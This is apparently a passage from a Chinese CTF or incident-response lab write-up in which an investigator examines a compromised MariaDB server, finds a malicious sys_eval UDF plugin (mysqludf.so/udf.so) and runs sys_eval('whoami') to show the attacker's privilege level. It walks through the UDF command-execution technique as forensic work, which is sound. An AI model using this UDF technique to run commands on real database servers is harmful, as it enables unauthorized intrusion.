+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/var/www/html# mysql -u root -p
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [(none)]&gt; show databases;
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| Database           |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| information_schema |
+</span></span><span class="line"><span class="cl">| cms                |
+</span></span><span class="line"><span class="cl">| mysql              |
+</span></span><span class="line"><span class="cl">| performance_schema |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">4 rows in set (0.00 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后切换到mysql数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">USE mysql;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后查看函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [mysql]&gt; select * from func;
+</span></span><span class="line"><span class="cl">+----------+-----+-------------+----------+
+</span></span><span class="line"><span class="cl">| name     | ret | dl          | type     |
+</span></span><span class="line"><span class="cl">+----------+-----+-------------+----------+
+</span></span><span class="line"><span class="cl">| sys_eval |   0 | mysqludf.so | function |
+</span></span><span class="line"><span class="cl">+----------+-----+-------------+----------+
+</span></span><span class="line"><span class="cl">1 row in set (0.01 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提权文件就是这个so</p>
+<p>然后全局find</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -name &#34;mysqludf.so&#34; 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="n">xuanji</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="c1"># find / -name &#34;mysqludf.so&#34; 2&gt;/dev/null</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span><span class="n">mysqludf</span><span class="o">.</span><span class="n">so</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>格式补兑，我们进目录看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/usr/lib/mysql/plugin# ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">4752</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x. <span class="m">1</span> mysql mysql      <span class="m">39</span> Aug  <span class="m">1</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x. <span class="m">1</span> root  root       <span class="m">20</span> Jul <span class="m">31</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">10416</span> May <span class="m">16</span>  <span class="m">2019</span> auth_pam.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql    <span class="m">6464</span> May <span class="m">16</span>  <span class="m">2019</span> auth_socket.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">10200</span> May <span class="m">16</span>  <span class="m">2019</span> dialog.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql <span class="m">1600136</span> May <span class="m">16</span>  <span class="m">2019</span> ha_innodb.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql  <span class="m">159304</span> May <span class="m">16</span>  <span class="m">2019</span> handlersocket.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql    <span class="m">6104</span> May <span class="m">16</span>  <span class="m">2019</span> mysql_clear_password.so
+</span></span><span class="line"><span class="cl">-rw-rw-rw-. <span class="m">1</span> mysql mysql   <span class="m">10754</span> Aug  <span class="m">1</span>  <span class="m">2023</span> mysqludf.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">39944</span> May <span class="m">16</span>  <span class="m">2019</span> semisync_master.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">14736</span> May <span class="m">16</span>  <span class="m">2019</span> semisync_slave.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">55696</span> May <span class="m">16</span>  <span class="m">2019</span> server_audit.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql <span class="m">2918008</span> May <span class="m">16</span>  <span class="m">2019</span> sphinx.so
+</span></span><span class="line"><span class="cl">-rw-r--r--. <span class="m">1</span> mysql mysql   <span class="m">11008</span> May <span class="m">16</span>  <span class="m">2019</span> sql_errlog.so
+</span></span><span class="line"><span class="cl">-rw-rw-rw-. <span class="m">1</span> mysql mysql      <span class="m">34</span> Aug  <span class="m">1</span>  <span class="m">2023</span> udf.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以最后路径就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/lib/mysql/plugin/udf.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>md5一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{b1818bde4e310f3d23f1005185b973e7}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4黑客获取的权限-flagwhoami后的值">4.黑客获取的权限 flag{whoami后的值}
+</h3><p>直接sys_eval执行一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [mysql]&gt; select sys_eval(&#34;whoami&#34;)
+</span></span><span class="line"><span class="cl">    -&gt; ;
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| sys_eval(&#34;whoami&#34;) |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| mysql
+</span></span><span class="line"><span class="cl">             |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">1 row in set (0.01 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{mysql}
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
